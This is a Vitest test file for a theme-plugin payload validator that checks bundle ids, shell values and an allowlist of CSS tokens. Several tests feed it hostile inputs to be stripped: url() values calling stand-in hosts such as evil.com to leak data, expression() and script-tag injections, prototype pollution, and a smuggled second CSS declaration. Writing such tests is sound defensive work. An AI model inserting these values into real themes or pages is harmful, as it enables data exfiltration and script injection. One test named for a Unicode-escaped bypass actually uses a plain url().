import { afterEach, beforeEach, describe, it, expect } from "vitest";
import { validateThemePayload } from "../domains/plugins.js";
import { setInstalledThemeIds } from "../../shared/plugin-theme-cache.js";
import { bundleToPluginTokens } from "../../ui/renderer/theme/plugin-token-map.js";
import { BUNDLES } from "../../ui/renderer/theme/bundles/index.js";

// Every theme but the compiled Moonstone and Gallery is an installed package.
const INSTALLED_THEMES = ["tokyo-night", "midnight", "forest", "violet-light", "violet-dark", "high-contrast"];

beforeEach(() => {
  setInstalledThemeIds(INSTALLED_THEMES);
});

afterEach(() => {
  setInstalledThemeIds([]);
});

// v2 helper: a full ThemeProvider v2 payload shape — tokens required per spec
const V2_PAYLOAD = {
  bundleId: "tokyo-night",
  shell: "dark",
  tokens: { "--ave-bg": "#0d0d12" },
} as const;

describe("validateThemePayload", () => {
  it("accepts a valid bundleId + shell (dark)", () => {
    const result = validateThemePayload({ bundleId: "tokyo-night", shell: "dark", tokens: { "--ave-bg": "#0d0d12" } });
    expect(result).toEqual({ ok: true, safe: { bundleId: "tokyo-night", shell: "dark", tokens: { "--ave-bg": "#0d0d12" } } });
  });

  it("accepts light shell", () => {
    const result = validateThemePayload({ bundleId: "violet-light", shell: "light", tokens: { "--ave-bg": "#fff" } });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.bundleId).toBe("violet-light");
      expect(result.safe.shell).toBe("light");
    }
  });

  it("accepts high-contrast bundle", () => {
    const result = validateThemePayload({ bundleId: "high-contrast", shell: "dark", tokens: { "--ave-bg": "#000" } });
    expect(result.ok).toBe(true);
  });

  it("rejects null", () => {
    const result = validateThemePayload(null);
    expect(result).toEqual({ ok: false, error: "invalid-payload" });
  });

  it("rejects non-object", () => {
    expect(validateThemePayload("dark")).toEqual({ ok: false, error: "invalid-payload" });
  });

  it("rejects unknown bundleId", () => {
    const result = validateThemePayload({ bundleId: "sepia", shell: "light" });
    expect(result).toEqual({ ok: false, error: "invalid-bundle-id" });
  });

  it("rejects missing bundleId", () => {
    const result = validateThemePayload({ shell: "dark" });
    expect(result).toEqual({ ok: false, error: "invalid-bundle-id" });
  });

  it("rejects unknown shell value", () => {
    const result = validateThemePayload({ bundleId: "tokyo-night", shell: "auto" });
    expect(result).toEqual({ ok: false, error: "invalid-shell" });
  });

  it("rejects missing shell", () => {
    const result = validateThemePayload({ bundleId: "tokyo-night" });
    expect(result).toEqual({ ok: false, error: "invalid-shell" });
  });

  it("accepts payload and strips unknown injected fields", () => {
    const result = validateThemePayload({
      bundleId: "midnight", shell: "dark",
      tokens: { "--ave-bg": "#000" },
      evil: "injected", __proto__: { polluted: true },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.bundleId).toBe("midnight");
      expect(result.safe.shell).toBe("dark");
      expect(result.safe.tokens).toEqual({ "--ave-bg": "#000" });
      expect((result.safe as Record<string, unknown>).evil).toBeUndefined();
    }
  });

  it("passes through valid --ave-* tokens", () => {
    const result = validateThemePayload({
      bundleId: "violet-dark", shell: "dark",
      tokens: { "--ave-bg": "hsl(0, 0%, 15%)", "--ave-primary": "#734dff" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toEqual({ "--ave-bg": "hsl(0, 0%, 15%)", "--ave-primary": "#734dff" });
    }
  });

  it("drops token keys not in the closed PLUGIN_TOKEN_NAMES allowlist", () => {
    const result = validateThemePayload({
      bundleId: "tokyo-night", shell: "dark",
      tokens: { "--ave-bg": "#fff", "--ave-unknown-new": "#abc", "--evil-key": "red", "color": "blue" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toEqual({ "--ave-bg": "#fff" });
    }
  });

  it("drops token values with url() injection", () => {
    const result = validateThemePayload({
      bundleId: "tokyo-night", shell: "dark",
      tokens: { "--ave-bg": "url(https://evil.com?leak=1)" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toEqual({});
    }
  });

  it("drops token values with expression() injection", () => {
    const result = validateThemePayload({
      bundleId: "tokyo-night", shell: "dark",
      tokens: { "--ave-bg": "expression(alert(1))" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toEqual({});
    }
  });

  it("drops token values with HTML tag injection", () => {
    const result = validateThemePayload({
      bundleId: "tokyo-night", shell: "dark",
      tokens: { "--ave-bg": "<script>x</script>" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toEqual({});
    }
  });

  it("returns stable empty tokens object when all token entries are filtered out", () => {
    const result = validateThemePayload({
      bundleId: "tokyo-night", shell: "dark",
      tokens: { "--evil": "red" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toEqual({});
    }
  });

  it("rejects token-less payload (tokens required)", () => {
    const result = validateThemePayload({ bundleId: "tokyo-night", shell: "dark" });
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toBe("missing-tokens");
    }
  });

  it("drops token values with Unicode-escaped url() — allowlist blocks bypass attempts", () => {
    const result = validateThemePayload({
      bundleId: "tokyo-night", shell: "dark",
      tokens: { "--ave-bg": "url(https://evil.com?leak=1)" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toEqual({});
    }
  });

  it("drops var() references — only literal HSL/hex/dimension values pass", () => {
    const result = validateThemePayload({
      bundleId: "tokyo-night", shell: "dark",
      tokens: { "--ave-bg": "var(--p-secret-color)" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toEqual({});
    }
  });

  it("accepts hsl with decimal values and hex colors", () => {
    const result = validateThemePayload({
      bundleId: "violet-dark", shell: "dark",
      tokens: { "--ave-radius": "0.6rem", "--ave-radius-sm": "0.25rem", "--ave-primary": "#734dff" },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.tokens).toEqual({ "--ave-radius": "0.6rem", "--ave-radius-sm": "0.25rem", "--ave-primary": "#734dff" });
    }
  });

  it("accepts the compiled bundles and every installed theme, and nothing else", () => {
    for (const bundleId of ["moonstone", "gallery"]) {
      expect(validateThemePayload({ bundleId, shell: "light", tokens: { "--ave-bg": "#fff" } }).ok, bundleId).toBe(true);
    }
    setInstalledThemeIds([]);
    expect(validateThemePayload({ bundleId: "tokyo-night", shell: "dark", tokens: { "--ave-bg": "#000" } }).ok).toBe(false);
  });

  it("accepts all 6 installed theme ids", () => {
    const cases: Array<[string, "light" | "dark"]> = [
      ["tokyo-night", "dark"],
      ["midnight", "dark"],
      ["forest", "light"],
      ["violet-light", "light"],
      ["violet-dark", "dark"],
      ["high-contrast", "dark"],
    ];
    for (const [bundleId, shell] of cases) {
      const result = validateThemePayload({ bundleId, shell, tokens: { "--ave-bg": "#000" } });
      expect(result.ok, `bundleId=${bundleId}`).toBe(true);
      if (result.ok) expect(result.safe.bundleId).toBe(bundleId);
    }
  });

  // The validator and the token producer have to agree on value shapes. When
  // they drifted, the seven derived color-mix tokens were dropped from every
  // payload and plugin panels silently kept the SDK's dark-theme fallbacks —
  // visible as a dark chip in a light shell, with nothing logged anywhere.
  it("keeps every token every compiled bundle produces", () => {
    // An installed theme is held to the same token table, so its tokens take the same shapes.
    for (const bundle of BUNDLES) {
      const tokens = bundleToPluginTokens(bundle);
      const result = validateThemePayload({ bundleId: bundle.id, shell: bundle.shell, tokens });
      expect(result.ok, `bundleId=${bundle.id}`).toBe(true);
      if (!result.ok) continue;
      const dropped = Object.keys(tokens).filter((key) => !(key in (result.safe.tokens ?? {})));
      expect(dropped, `bundleId=${bundle.id}`).toEqual([]);
    }
  });

  it("accepts a color-mix token but not one carrying a second declaration", () => {
    const result = validateThemePayload({
      bundleId: "violet-light",
      shell: "light",
      tokens: {
        "--ave-primary-bg-subtle": "color-mix(in srgb, hsl(217.2, 91.2%, 59.8%) 14%, hsl(0, 0%, 100%))",
        "--ave-focus-shadow": "color-mix(in srgb, #734dff 62%, transparent)",
        "--ave-input-bar-placeholder": "hsla(222.2, 84%, 7%, 0.82)",
        "--ave-surface-hover": "color-mix(in srgb, hsl(0, 0%, 0%) 6%, hsl(0, 0%, 96%)); background:url(https://evil.example)",
        "--ave-primary-bg-strong": "color-mix(in srgb, color-mix(in srgb, #fff 5%, #000) 28%, transparent)",
      },
    });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(Object.keys(result.safe.tokens ?? {}).sort()).toEqual([
        "--ave-focus-shadow",
        "--ave-input-bar-placeholder",
        "--ave-primary-bg-subtle",
      ]);
    }
  });

  it("v2 payload (V2_PAYLOAD const) round-trips correctly", () => {
    const result = validateThemePayload(V2_PAYLOAD);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.safe.bundleId).toBe("tokyo-night");
      expect(result.safe.shell).toBe("dark");
      expect(result.safe.tokens).toEqual({ "--ave-bg": "#0d0d12" });
    }
  });
});
